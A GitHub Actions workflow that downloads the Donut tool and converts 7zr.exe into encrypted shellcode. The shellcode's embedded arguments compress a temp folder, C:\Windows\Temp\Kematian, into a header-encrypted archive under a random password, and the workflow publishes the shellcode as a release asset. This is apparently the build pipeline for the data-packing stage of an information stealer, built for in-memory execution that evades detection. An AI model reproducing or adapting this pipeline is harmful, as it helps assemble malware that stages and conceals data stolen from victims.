name: Build 7zr Tool

on:
  push:
    branches: [main]
    paths:
      - 'frontend-src/**'

jobs:
  build:
    strategy:
      matrix:
        configuration: [Release]

    runs-on: windows-latest
    permissions:
      contents: write
      pull-requests: write
      repository-projects: write
    
    steps:
    - name: Checkout Repository
      uses: actions/checkout@v3

    - name: Delete Tag and Release
      uses: dev-drprasad/delete-tag-and-release@v1.1
      with:
        tag_name: 7zrBuild
        delete_release: true
        github_token: ${{ secrets.GITHUB_TOKEN }}

    - name: Create Release
      id: create_release
      uses: actions/create-release@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        tag_name: 7zrBuild
        release_name: 7zrBuild
        body: "7zrBuild"
        draft: false
        prerelease: true

    - name: Download Donut
      run: Invoke-WebRequest -Uri https://github.com/TheWover/donut/releases/download/v1.0/donut_v1.0.zip -OutFile donut.zip

    - name: Extract Donut
      run: Expand-Archive -Path donut.zip -DestinationPath donut

    - name: Convert 7zr to Shellcode with Encryption Key 
      run: |
        # Generate random bytes for encryption key
        $randomBytes = [byte[]]@(1..16 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
        $aeskey = [System.Convert]::ToBase64String($randomBytes)
        Write-Host "Decryption KEY: $aeskey" -ForegroundColor Green

        # Define arguments for donut
        $arguments = "a -t7z -mx=9 -mhe=on Kematian.7z C:\Windows\Temp\Kematian -p$aeskey"

        # Run donut.exe to convert 7zr to shellcode
        .\donut\donut.exe -i frontend-src\7zr.exe -x2 -a2 -p $arguments -o 7zr.bin -z 4

    - name: Upload Release Asset
      id: upload-release-asset
      uses: actions/upload-release-asset@v1
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      with:
        upload_url: ${{ steps.create_release.outputs.upload_url }}
        asset_path: 7zr.bin
        asset_name: 7zr.bin
        asset_content_type: application/zip